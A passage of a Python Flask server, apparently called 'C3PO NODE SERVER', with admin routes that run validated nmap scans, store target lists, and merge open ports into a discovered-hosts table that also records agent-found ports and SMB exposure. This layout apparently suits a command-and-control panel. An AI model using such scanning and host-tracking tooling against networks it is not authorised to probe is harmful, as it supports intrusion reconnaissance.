# ── nmap scanning ──────────────────────────────────────────────────────────────

SAFE_TARGET_RE = re.compile(r'^[\d./a-zA-Z:\-]+$')

NMAP_PRESETS = {
    '-sT':          'TCP Connect (no root needed, reliable)',
    '-sS':          'SYN Stealth (requires root, faster)',
    '-sU':          'UDP scan (slow, requires root)',
    '-sV':          'Version detection (banner grab all open ports)',
    '-A':           'Aggressive (OS + version + scripts + traceroute)',
    '-O':           'OS fingerprint only (requires root)',
    '-sT -sV':      'Connect + Version (safe, detailed)',
    '-sS -sV -O':   'Stealth + Version + OS (full picture, needs root)',
    '-p-':          'All 65535 ports TCP connect (slow, complete)',
    '-sT --top-ports 1000': 'Top 1000 ports TCP (fast default)',
}

def _parse_nmap_hosts(output):
    """Parse nmap stdout into {ip: [port, ...]} dict."""
    hosts = {}
    current_ip = None
    for line in output.splitlines():
        m = re.search(r'Nmap scan report for (?:\S+ \()?(\d+\.\d+\.\d+\.\d+)', line)
        if m:
            current_ip = m.group(1)
            hosts[current_ip] = []
        elif current_ip and re.match(r'\d+/\w+\s+open', line):
            port = line.split('/')[0].strip()
            hosts[current_ip].append(port)
    return hosts

@app.route('/admin/quick_targets', methods=['GET'])
@require_auth
def list_quick_targets():
    with db() as conn:
        rows = conn.execute('SELECT * FROM quick_targets ORDER BY created_at ASC').fetchall()
    return jsonify([dict(r) for r in rows])

@app.route('/admin/quick_targets', methods=['POST'])
@require_auth
def add_quick_target():
    label = (request.form.get('label') or '').strip()
    value = (request.form.get('value') or '').strip()
    if not label or not value:
        return jsonify({'error': 'label and value required'}), 400
    if not SAFE_TARGET_RE.match(value):
        return jsonify({'error': 'value must be a valid IP, CIDR, or hostname'}), 400
    with db() as conn:
        conn.execute('INSERT INTO quick_targets (label, value, created_at) VALUES (?,?,?)',
                     (label, value, time.time()))
    return jsonify({'ok': True})

@app.route('/admin/quick_targets/<int:tid>', methods=['DELETE'])
@require_auth
def delete_quick_target(tid):
    with db() as conn:
        conn.execute('DELETE FROM quick_targets WHERE id=?', (tid,))
    return jsonify({'ok': True})

@app.route('/admin/nmap', methods=['POST'])
@require_auth
def run_nmap():
    target = request.form.get('target', '').strip()
    flags  = request.form.get('flags', '-sT').strip()
    ports  = request.form.get('ports', '').strip()

    if not target or not SAFE_TARGET_RE.match(target):
        return jsonify({'error': 'invalid target — use IP, CIDR, or hostname only'}), 400

    # Validate each token individually — allows -sT, -A, -Pn, --top-ports, etc.
    ALLOWED_FLAGS = re.compile(
        r'^(-[sSTUVAOPnNvvpoeAfgRrd6]+'  # short flags: -sT -sV -A -Pn -O -n etc.
        r'|--top-ports'
        r'|--open'
        r'|--min-rate'
        r'|--max-retries'
        r'|--host-timeout'
        r'|--script=[\w,]+)$'
    )
    for token in flags.split():
        if not ALLOWED_FLAGS.match(token):
            return jsonify({'error': f'flag not allowed: {token}  (use standard nmap flags)'}), 400

    cmd = ['nmap'] + flags.split()
    if ports:
        if not re.match(r'^[\d,\-]+$', ports):
            return jsonify({'error': 'invalid port spec'}), 400
        cmd += ['-p', ports]
    cmd += [target]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        output = result.stdout
        if result.stderr:
            output += '\n[stderr]\n' + result.stderr
    except FileNotFoundError:
        output = 'nmap not found — install with: sudo apt install nmap'
    except subprocess.TimeoutExpired:
        output = 'scan timed out after 180s (use fewer ports or faster scan)'

    # Parse and persist open ports per host
    parsed = _parse_nmap_hosts(output)
    if parsed:
        conn = sqlite3.connect(DB)
        conn.row_factory = sqlite3.Row
        now = time.time()
        for ip, port_list in parsed.items():
            ports_str = ','.join(port_list)
            conn.execute(
                'INSERT INTO nmap_scans (target, host_ip, open_ports, raw_output, scanned_at) VALUES (?,?,?,?,?)',
                (target, ip, ports_str, output, now)
            )
            # Upsert into discovered so the Discovered Hosts panel reflects nmap results
            existing = conn.execute('SELECT id, open_ports FROM discovered WHERE ip=?', (ip,)).fetchone()
            if existing:
                # Merge nmap ports with any agent-found ports
                existing_ports = set(p.strip() for p in (existing['open_ports'] or '').split(',') if p.strip())
                existing_ports.update(port_list)
                merged = ','.join(sorted(existing_ports, key=lambda x: int(x) if x.isdigit() else 0))
                conn.execute('UPDATE discovered SET open_ports=?, has_smb=? WHERE id=?',
                             (merged, 1 if '445' in existing_ports else 0, existing['id']))
            else:
                has_smb = 1 if '445' in port_list else 0
                conn.execute(
                    'INSERT INTO discovered (discovered_by, ip, hostname, open_ports, has_smb, first_seen) VALUES (?,?,?,?,?,?)',
                    ('nmap', ip, '', ports_str, has_smb, now)
                )
        conn.commit()
        conn.close()

    return jsonify({'output': output, 'target': target, 'flags': flags, 'hosts_found': len(parsed)})

# ── entrypoint ────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    print(f'[*] C3PO NODE SERVER v{VERSION}')
    print(f'[*] Dashboard: http://0.0.0.0:{PORT}')
    print(f'[*] Login: admin / {ADMIN_PASS}')
    app.run(host='0.0.0.0', port=PORT, debug=False)
